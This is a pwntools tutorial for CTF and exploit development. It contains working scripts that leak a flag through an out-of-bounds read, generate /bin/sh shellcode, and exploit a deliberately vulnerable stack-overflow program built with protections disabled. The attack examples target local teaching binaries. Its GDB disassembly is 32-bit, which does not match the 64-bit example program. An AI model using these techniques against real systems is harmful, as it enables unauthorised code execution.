# Pwntools Tutorial
---

Even though pwntools is an excellent CTF framework, it is also an exploit development library. It was developed by Gallopsled, a European CTF team, under the context that exploit developers have been writing the same tools over and over again with different variations. Pwntools comes to level the playing field and bring together developers to create a common framework of tools.

## Installation
---

```bash
$ pip install -U pwntools
```

## Local and remote I/O
---

Pwntools enables you to dynamically interact (through scripting) with either local or remote processes, as follows:

```python
IP = '10.11.12.13'
PORT = 1337
local = False
if not local:
    io = remote(IP, PORT)
else:
    io = process('/path/to/binary')

io.interactive()
```

We can send and receive data from a local or remote process via `send`, `sendline`, `recv`, `recvline`, `recvlines` and `recvuntil`.

Let's construct a complete example in which we interact with a local process.

```c
#include <stdio.h>

int main(int argc, char* argv[])
{
	char flag[10] = {'S', 'E', 'C', 'R', 'E', 'T', 'F', 'L', 'A', 'G'};
	char digits[10] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
	int index = 0;

	while (1) {
		printf("Give me an index and I'll tell you what's there!\n");
		scanf("%d", &index);
		printf("Okay, here you go: %p %c\n", &digits[index], digits[index]);
	}
	return 0;
}
```

Let's leak one byte of the flag using pwntools.

```python
#!/usr/bin/env python
from pwn import *

io = process('leaky')

# "Give me an index and I'll tell you what's there!\n
io.recvline()

# Send offset -10
io.sendline('-10')

# Here you go\n
result = io.recvline()

print(b"Got: " + result)

io.interactive()
```

If we run the previous script, we get the following output:

```
[+] Starting local process './leaky': Done
Got: Okay, here you go: 0xffe947d8 S

[*] Switching to interactive mode
[*] Process './leaky' stopped with exit code 0
[*] Got EOF while reading in interactive
$
```

Notice the $ prompt which still awaits input from us to feed the process. This is due to the `io.interactive()` line at the end of the script.

We can encapsulate the previous sequence of interactions inside a function which we can loop.

```python
#!/usr/bin/env python
from pwn import *

def leak_char(offset):
    # "Give me an index and I'll tell you what's there!\n
    io.recvline()

    # Send offset
    io.sendline(str(offset))

    # Here you go\n
    result = io.recvline()

    # Parse the result
    leaked_char = result.split(b'go: ')[1].split(b' ')[1].split(b'\n')[0]
    return leaked_char

io = process('leaky')

flag = ''

for i in range(-10,0):
    flag += leak_char(i).decode("utf-8")

print("The flag is: " + flag)
io.close()
```

If we run this script, we leak the flag.

```bash
$ ./demo_pwn.py
[+] Starting local process './leaky': Done
The flag is: SECRETFLAG
[*] Stopped program './leaky'
```

## Logging
---

The previous example was a bit… quiet. Fortunately, pwntools has nicely separated logging capabilities to make things more verbose for debugging and progress-viewing purposes. Let's log each of our steps within the `leak_char` function.

```python
def leak_char(offset):
    # "Give me an index and I'll tell you what's there!\n
    io.recvline()

    # Send offset
    log.info("Sending request for offset: " + str(offset))
    io.sendline(str(offset))

    # Here you go\n
    result = io.recvline()
    log.info("Got back raw response: {}".format(result))

    # Parse the result
    leaked_char = result.split(b'go: ')[1].split(b' ')[1].split(b'\n')[0]
    log.info("Parsed char: {}".format(leaked_char))
    return leaked_char
```

Now the output should be much more verbose:

```
[+] Starting local process './leaky': Done
[*] Sending request for offset: -10
[*] Got back raw response: Okay, here you go: 0xffb14948 S
[*] Parsed char: S
[*] Sending request for offset: -9
[*] Got back raw response: Okay, here you go: 0xffb14949 E
[*] Parsed char: E
[*] Sending request for offset: -8
[*] Got back raw response: Okay, here you go: 0xffb1494a C
[*] Parsed char: C
[*] Sending request for offset: -7
[*] Got back raw response: Okay, here you go: 0xffb1494b R
[*] Parsed char: R
[*] Sending request for offset: -6
[*] Got back raw response: Okay, here you go: 0xffb1494c E
[*] Parsed char: E
[*] Sending request for offset: -5
[*] Got back raw response: Okay, here you go: 0xffb1494d T
[*] Parsed char: T
[*] Sending request for offset: -4
[*] Got back raw response: Okay, here you go: 0xffb1494e F
[*] Parsed char: F
[*] Sending request for offset: -3
[*] Got back raw response: Okay, here you go: 0xffb1494f L
[*] Parsed char: L
[*] Sending request for offset: -2
[*] Got back raw response: Okay, here you go: 0xffb14950 A
[*] Parsed char: A
[*] Sending request for offset: -1
[*] Got back raw response: Okay, here you go: 0xffb14951 G
[*] Parsed char: G
[*] The flag is: SECRETFLAG
[*] Stopped program './leaky'
```

## Assembly and ELF manipulation
---

Pwntools can also be used for precision work, like working with ELF files and their symbols.

```python
#!/usr/bin/env python
from pwn import *

leaky_elf = ELF('leaky')
main_addr = leaky_elf.symbols['main']

# Print address of main
log.info("Main at: " + hex(main_addr))

# Disassemble the first 14 bytes of main
log.info(disasm(leaky_elf.read(main_addr, 14), arch='x86'))
```

We can also write ELF files from raw assembly; this is very useful for testing shellcodes.

```python
#!/usr/bin/env python
from pwn import *

sh_shellcode = """
        mov eax, 11
        push 0
        push 0x68732f6e
        push 0x69622f2f
        mov ebx, esp
        mov ecx, 0
        mov edx, 0
        int 0x80
"""

e = ELF.from_assembly(sh_shellcode, vma=0x400000)

with open('test_shell', 'wb') as f:
    f.write(e.get_data())
```

> This will result in a binary named test_shell which executes the necessary assembly code to spawn a shell.
> ```bash
> $ chmod u+x test_shell
> $ ./test_shell
> ```

## Shellcode generation
---

Pwntools comes with the `shellcraft` module, which is quite extensive in its capabilities.

```python
print(shellcraft.read(0, 0xffffeeb0, 20)) # Construct a shellcode which reads from stdin to a buffer on the stack 20 bytes
    /* call read(0, 0xffffeeb0, 0x14) */
    push (SYS_read) /* 3 */
    pop eax
    xor ebx, ebx
    push 0xffffeeb0
    pop ecx
    push 0x14
    pop edx
    int 0x80
```

It also works with other architectures:

```python
print(shellcraft.arm.read(0, 0xffffeeb0, 20))
    /* call read(0, 4294962864, 20) */
    eor  r0, r0 /* 0 (#0) */
    movw r1, #0xffffeeb0 & 0xffff
    movt r1, #0xffffeeb0 >> 16
    mov  r2, #0x14
    mov  r7, #(SYS_read) /* 3 */
    svc  0

print(shellcraft.mips.read(0, 0xffffeeb0, 20))
    /* call read(0, 0xffffeeb0, 0x14) */
    slti $a0, $zero, 0xFFFF /* $a0 = 0 */
    li $a1, 0xffffeeb0
    li $t9, ~0x14
    not $a2, $t9
    li $t9, ~(SYS_read) /* 0xfa3 */
    not $v0, $t9
    syscall 0x40404
```

These shellcodes can be directly assembled using asm inside your script, and given to the exploited process via the `send*` functions.

```python
  shellcode = asm('''
       mov rdi, 0
       mov rax, 60
       syscall
''', arch = 'amd64')
```


> Most of the time you'll be working with as specific vulnerable program. To avoid specifing architecture for the asm function or to shellcraft you can define the context at the start of the script which will imply the architecture from the binary header.
> ```python
> context.binary = './vuln_program'
>
> shellcode = asm('''
>       mov rdi, 0
>       mov rax, 60
>       syscall
> ''')
> print(shellcraft.sh())
> ```

## GDB integration
---

Most importantly, pwntools provides GDB integration, which is extremely useful.

Let's follow an example using the following program:
```asm
extern gets
extern printf

section .data
formatstr: db "Enjoy your leak: %p",0xa,0

section .text
global main
main:
	push rbp
	mov rbp, rsp
	sub rsp, 64
	lea rbx, [rbp - 64]
	mov rsi, rbx
	mov rdi, formatstr
	call printf
	mov rdi, rbx
	call gets
	leave
	ret
```
Compile it with:
```bash
$ nasm vuln.asm -felf64
$ gcc -no-pie -fno-pic  -fno-stack-protector -z execstack vuln.o -o vuln
```

Use this script to exploit the program:
```python
#!/usr/bin/env python
from pwn import *

ret_offset = 72
buf_addr = 0x7fffffffd710
ret_address = buf_addr+ret_offset+16

# This sets several relevant things in the context (such as endianess,
# architecture etc.), based on the given binary's properties.
# We could also set them manually:
# context.arch = "amd64"
context.binary = "vuln"
p = process("vuln")


payload = b""
# Garbage
payload += ret_offset * b"A"

# Overwrite ret_address, taking endianness into account
payload += pack(ret_address)

# Add nopsled
nops = asm("nop")*100

payload += nops

# Assemble a shellcode from 'shellcraft' and append to payload
shellcode = asm(shellcraft.sh())
payload += shellcode

# Attach to process
gdb.attach(p)

# Wait for breakpoints, commands etc.
raw_input("Send payload?")

# Send payload
p.sendline(payload)

# Enjoy shell :-)
p.interactive()
```

Notice the `gdb.attach(p)` and raw_input lines. The former will open a new terminal window with GDB already attached. All of your GDB configurations will be used, so this works with PEDA as well. Let's set a breakpoint at the ret instruction from the main function:
```gdb
gdb-peda$ pdis main
Dump of assembler code for function main:
   0x08048440 <+0>:	push   ebp
   0x08048441 <+1>:	mov    ebp,esp
   0x08048443 <+3>:	sub    esp,0x40
   0x08048446 <+6>:	lea    ebx,[ebp-0x40]
   0x08048449 <+9>:	push   ebx
   0x0804844a <+10>:	push   0x804a020
   0x0804844f <+15>:	call   0x8048300 <printf@plt>
   0x08048454 <+20>:	push   ebx
   0x08048455 <+21>:	call   0x8048310 <gets@plt>
   0x0804845a <+26>:	add    esp,0x4
   0x0804845d <+29>:	leave
   0x0804845e <+30>:	ret
   0x0804845f <+31>:	nop
End of assembler dump.
gdb-peda$ b *0x0804845e
Breakpoint 1 at 0x804845e
gdb-peda$ c
Continuing.
```

The continue command will return control to the terminal in which we're running the pwntools script. This is where the raw_input comes in handy, because it will wait for you to say “go” before proceeding further. Now if you hit `<Enter>` at the Send payload? prompt, you will notice that GDB has reached the breakpoint you've previously set.

You can now single-step each instruction of the shellcode inside GDB to see that everything is working properly. Once you reach int `0x80`, you can continue again (or close GDB altogether) and interact with the newly spawned shell in the pwntools session.
